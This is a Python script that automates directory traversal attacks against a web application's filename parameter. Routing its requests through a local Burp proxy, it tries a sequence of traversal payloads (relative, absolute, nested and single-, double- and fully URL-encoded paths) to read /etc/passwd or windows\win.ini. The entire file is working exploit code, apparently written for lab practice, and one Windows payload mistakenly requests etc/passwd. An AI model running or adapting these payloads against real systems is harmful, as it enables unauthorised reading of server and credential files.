import requests
import urllib3
import sys

# Suppress insecure requests warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set up proxy to use Burp
proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

def dir_traversal(url):
    os_type = input("[-] Press 1 for *nix or 2 for Windows: ")
    if os_type == '1':
        # Attempt to pull /etc/passwd
        r = requests.get(url + '../../../etc/passwd', proxies=proxies, verify=False)
        if r.status_code == 200:
            print('[+] Traversal successful')
            return r.text
        else:
            r_abs = requests.get(url + '/etc/passwd', proxies=proxies, verify=False)
            if r_abs.status_code == 200:
                print('[+] Direct path successful')
                return r_abs.text
            else:
                r_nested = requests.get(url + '....//....//....//etc//passwd', proxies=proxies, verify=False)
                if r_nested.status_code == 200:
                    print('[+] Nested successful')
                    return r_nested.text
                else:
                    fuzz_1 = requests.get(url + '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', proxies=proxies, verify=False)
                    if fuzz_1.status_code == 200:
                        print('[+] Single URL encode successful')
                        return fuzz_1.text
                    else:
                        fuzz_2 = requests.get(url + '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd', proxies=proxies, verify=False)
                        if fuzz_2.status_code == 200:
                            print('[+] Double URL encode successful')
                            return fuzz_2.text
                        else:
                            fuzz_3 = requests.get(url + '%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64', proxies=proxies, verify=False)
                            if fuzz_3.status_code == 200:
                                print('[+] Full URL encode successful')
                                return fuzz_3.text
                            else:
                                right_start = requests.get(url + '/var/www/images/../../../etc/passwd', proxies=proxies, verify=False)
                                if right_start.status_code == 200:
                                    print('[+] Correct start successful')
                                    return right_start.text
                                else:
                                    print('[-] Directory traversal failed - attempt more advanced exploitation.')
    
    elif os_type == '2':
        # Attempt to pull windows/win.ini
        r = requests.get(url + '..\..\..\windows\win.ini', proxies=proxies, verify=False)
        if r.status_code == 200:
            print('[+] Traversal successful')
            return r.text
        else:
            r_abs = requests.get(url + '\windows\win.ini', proxies=proxies, verify=False)
            if r_abs.status_code == 200:
                print('[+] Direct path successful')
                return r_abs.text
            else:
                r_nested = requests.get(url + '....\/....\/....\/windows\/win.ini', proxies=proxies, verify=False)
                if r_nested.status_code == 200:
                    print('[+] Nested successful')
                    return r_nested.text
                else:
                    fuzz_1 = requests.get(url + '%2e%2e%5c%2f%2e%2e%5c%2f%2e%2e%5c%2fwindows%5cwin.ini', proxies=proxies, verify=False)
                    if fuzz_1.status_code == 200:
                        print('[+] Single URL encode successful')
                        return fuzz_1.text
                    else:
                        fuzz_2 = requests.get(url + '%252e%252e%255c%252f%252e%252e%255c%252f%252e%252e%255c%252fwindows%255cwin.ini', proxies=proxies, verify=False)
                        if fuzz_2.status_code == 200:
                            print('[+] Double URL encode successful')
                            return fuzz_2.text
                        else:
                            fuzz_3 = requests.get(url + '%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64', proxies=proxies, verify=False)
                            if fuzz_3.status_code == 200:
                                print('[+] Full URL encode successful')
                                return fuzz_3.text
                            else:
                                right_start = requests.get(url + '\var\www\images\..\..\..\windows\win.ini', proxies=proxies, verify=False)
                                if right_start.status_code == 200:
                                    print('[+] Correct start successful')
                                    return right_start.text
                                else:
                                    print('[-] Directory traversal failed - attempt more advanced exploitation.')
    else:
        print('[-] Invalid selection - exiting.')
        sys.exit(-1)
    

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    
    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <url>')
        print(f'[-] Example: {sys.argv[0]} www.example.com/image?filename=')
        sys.exit(-1)
    
    print('[-] Attempting directory traversal exploitation - simple, absolute path, nested, URL encoding')
    exploit = dir_traversal(url)
    print(exploit)
